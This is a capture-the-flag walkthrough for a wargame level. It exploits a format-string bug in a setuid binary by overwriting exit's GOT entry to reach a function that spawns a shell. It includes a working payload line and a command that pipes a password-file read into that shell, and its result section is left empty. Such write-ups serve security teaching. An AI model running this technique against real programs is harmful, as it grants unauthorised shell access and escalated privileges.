level5 - walkthrough
====================

Target: /home/user/level5/level5   (setuid + setgid level6)
Goal:   read /home/user/level6/.pass

1. The bug
   n() does printf(buf) on our input (format-string vulnerability), then calls
   exit(1). There is no magic-value branch this time -- but exit is called
   through the GOT, and there is an unused o() at 0x080484a4 that runs
   system("/bin/sh").

     $ objdump -R level5 | grep exit
       08049838 R_386_JUMP_SLOT   exit     <-- writable GOT slot

2. Plan
   Overwrite exit@GOT (0x08049838) with &o (0x080484a4). When n() calls exit(1)
   the program jumps into o() instead, giving a shell.

3. Find our argument position
     $ python -c 'print "AAAA" + ".%x"*8' | ./level5
   0x41414141 is the 4th value, so our input is at position 4.

4. Payload  (Ressources/exploit.py)
     payload = p32(0x08049838) + b"%134513824x" + b"%4$n"
   The 4 address bytes print as 4 chars, %134513824x prints 134513824 more ->
   134513828 = 0x080484a4 total, and %4$n writes that into exit@GOT. One big %n
   instead of two %hn halves -- ~128 MB of padding, but it works locally.

5. Run
     $ python3 Ressources/exploit.py
     $ (cat payload; printf '\n'; sleep 1; echo 'cat /home/user/level6/.pass') | ./level5
   After the padding, exit() jumps to o() -> system("/bin/sh"); the command left
   in the pipe (after the pause) is run by that shell.

6. Result -- level6 password:
